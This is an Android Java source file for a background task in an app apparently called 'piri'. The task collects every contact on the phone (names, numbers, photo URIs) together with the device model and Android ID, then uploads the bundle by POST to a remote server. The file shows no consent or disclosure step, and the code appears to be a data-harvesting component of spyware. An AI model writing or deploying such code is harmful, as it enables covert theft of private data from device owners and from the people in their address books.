package com.alirnp.piri;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.lang.ref.WeakReference;
import java.util.List;

import me.everything.providers.android.contacts.Contact;
import me.everything.providers.android.contacts.ContactsProvider;
import me.everything.providers.core.Data;

public class GetContactsTask extends AsyncTask<Void, Void, JSONObject> {

    WeakReference<Context> contextWeakReference;
    OnSuccessListener onSuccessListener;

    GetContactsTask(Context context, OnSuccessListener onSuccessListener) {
        this.contextWeakReference = new WeakReference<>(context);
        this.onSuccessListener = onSuccessListener;
    }

    @Override
    protected JSONObject doInBackground(Void... params) {

        JSONObject jsonObject = new JSONObject();
        JSONArray array = new JSONArray();

        try {

            Context context = contextWeakReference.get();
            if (context == null) return null;

            ContactsProvider contactsProvider = new ContactsProvider(context);
            Data<Contact> contacts = contactsProvider.getContacts();
            List<Contact> contactList = contacts.getList();

            String android_id = Settings.Secure.getString(contextWeakReference.get().getContentResolver(), Settings.Secure.ANDROID_ID);

            jsonObject.put(Constants.PHONE_MODEL, getDeviceModel());
            jsonObject.put(Constants.SERIAL_NUMBER, android_id);
            jsonObject.put(Constants.SIZE, String.valueOf(contactList.size()));


            for (int i = 0; i < contactList.size(); i++) {
                JSONObject contactObject = new JSONObject();
                Contact contact = contactList.get(i);

                if (contact != null) {

                    contactObject.put(Constants.PHONE, contact.phone);
                    contactObject.put(Constants.DISPLAY_NAME, contact.displayName);
                    contactObject.put(Constants.URI_PHOTO, contact.uriPhoto);

                    array.put(contactObject);


                } else {
                    Log.i(Constants.TAG, "onPostExecute: ERROR");
                }

            }

            jsonObject.put(Constants.CONTACTS, array);


        } catch (JSONException e) {
            Log.i(Constants.TAG, "doInBackground: " + e);
        }

        return jsonObject;
    }

    @Override
    protected void onPostExecute(JSONObject jsonObject) {
        Context context = contextWeakReference.get();
        if (context == null) return;

        Log.i(Constants.TAG, "onPostExecute: Contacts : True");

        sendToServer(context ,jsonObject);
    }

    private String getDeviceModel(){
        return Build.MANUFACTURER
                + " " + Build.MODEL + " " + Build.VERSION.RELEASE
                + " " + Build.VERSION_CODES.class.getFields()[android.os.Build.VERSION.SDK_INT].getName();
    }

    private void sendToServer(Context context, JSONObject jsonObject) {
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, Constants.URL_CONTACT, jsonObject,
                response -> {
                    if (onSuccessListener != null) {
                        try {
                            boolean success = response.getBoolean("success");
                            onSuccessListener.OnSuccess(success, Constants.State.CONTACTS);

                            Log.i(Constants.TAG, "success Contact : " + success);


                        } catch (JSONException e) {
                            Log.i(Constants.TAG, e.toString());
                            onSuccessListener.OnSuccess(false, Constants.State.CONTACTS);
                        }
                    } else {
                        throw new IllegalArgumentException("onSuccessListener is null");
                    }


                }
                , error -> {
            onSuccessListener.OnSuccess(false, Constants.State.CONTACTS);
            Log.i(Constants.TAG, "onPostExecute: " + error.toString());
        });


        request.setRetryPolicy(new DefaultRetryPolicy(70000, DefaultRetryPolicy.DEFAULT_MAX_RETRIES, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
        RequestQueue queue = Volley.newRequestQueue(context);
        queue.add(request);
    }

}
